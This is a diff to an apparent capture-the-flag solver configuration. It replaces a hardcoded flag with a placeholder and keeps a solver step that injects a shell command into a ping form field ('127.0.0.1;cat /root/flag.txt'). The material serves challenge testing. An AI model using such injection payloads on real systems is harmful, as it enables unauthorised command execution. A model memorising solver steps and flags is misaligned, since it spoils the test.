@@ -28,10 +28,10 @@ solver:
     command: curl -s -X POST http://{target.webapp}/ping -d 'host=127.0.0.1;cat /root/flag.txt' | grep -E '^[a-z0-9_]+$' | head -1
     expect: 1nj3ct3d
   - name: Verify complete flag
-    command: echo 'OCR{cmd_1nj3ct3d}'
-    expect: OCR{cmd_1nj3ct3d}
+    command: echo '{flag}'
+    expect: '{flag}'
 expected_flag_count: 1
-expected_flag: OCR{cmd_1nj3ct3d}
+expected_flag: '{flag}'
 forbidden_networks:
 - control-plane
 - database
